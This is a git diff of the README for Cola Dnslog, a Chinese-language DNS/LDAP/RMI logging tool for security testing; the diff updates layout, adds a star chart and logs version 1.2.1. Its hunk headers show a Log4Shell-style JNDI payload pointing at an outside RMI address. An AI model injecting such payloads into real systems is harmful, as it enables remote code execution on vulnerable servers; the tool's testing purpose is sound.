@@ -1,15 +1,14 @@
-<div style="text-align:center;" width="100%">
-<img src="readme_resource/sugarless.png" alt="sugarless" width="45%" />
-<img src="readme_resource/dnslog.png" alt="dnslog" width="45%" />
+<div align="center">
+<img src="readme_resource/sugarless.png" alt="sugarless" width="30%" />
+<img src="readme_resource/dnslog.png" alt="dnslog" width="30%" />
 </div>
-
-
-
 英文版本在路上......
 
-# Cola-Dnslog
+# Cola Dnslog
 
-<p style="text-align:right;">--AbelChe</p>
+<div align="right">
+<p>--AbelChe</p>
+</div>
 
 涉及到技术、框架：
 
@@ -22,6 +21,8 @@
 特色：
 
 `Dingtalk Robot` `Bark` `API` `ldaplog` `rmilog` `Docker`
+
+[![Stargazers over time](https://starchart.cc/AbelChe/cola_dnslog.svg)](https://starchart.cc/AbelChe/cola_dnslog)
 
 ## 🥯 使用方法
 
@@ -289,6 +290,9 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 
 ## 📔 更新日志
 
+- 2022-08-03 v1.2.1
+  1. 更新readme
+
 - 2022-08-02 v1.2.0
   1. 增加bark提醒功能
   2. 修改logserver端http的返回为1x1的gif格式图片
@@ -318,6 +322,7 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 ## 📜 声明
 
 本项目使用 Apache License 2.0
+
 
 ## 💦 其他
 
